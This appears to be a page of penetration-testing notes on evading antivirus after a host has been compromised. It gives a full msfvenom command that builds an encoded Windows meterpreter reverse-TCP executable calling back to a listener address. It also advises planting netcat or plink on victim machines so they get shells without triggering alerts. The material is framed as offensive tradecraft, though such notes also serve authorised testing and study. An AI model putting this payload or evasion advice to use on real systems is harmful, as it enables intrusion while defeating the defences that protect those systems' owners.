# AntiVirus Bypass

So we've compromised a host but AV is preventing us from doing much interesting.  Let's work out how to evade it.

## shikata\_ga\_nai

Perhaps the least effective of all these methods is the shikata\_ga\_nai encoding within the msfvenom payload generator.  This wasn't designed to evade AV and is more a tool for removing unwanted characters, but nevertheless it did prove effective in some cases of evading AV.  Since vendors have access to metasploit now, most AV will detect it.

I have had some luck with this but with very uncommon or simple payload types, and something like embedding a meterpreter almost never worked:

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=1234 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe
```

## Non-Malicious Binaries

> If you don't want to trigger AV, use something AV isn't looking for!

Several binaries have uses as part of system administration or just general computing tasks but can also aid you in achieving a shell or moving your payload onto the system in memory.  In this cases binaries like netcat, [plink ](https://putty.org/)and others can be placed on the remote machine and generally will not trigger the antivirus alert.

You can use techniques like this to aid in escalating and keeping the actual malicious payloads in memory.  This is unlikely to be a defence against Next-Gen AV however.

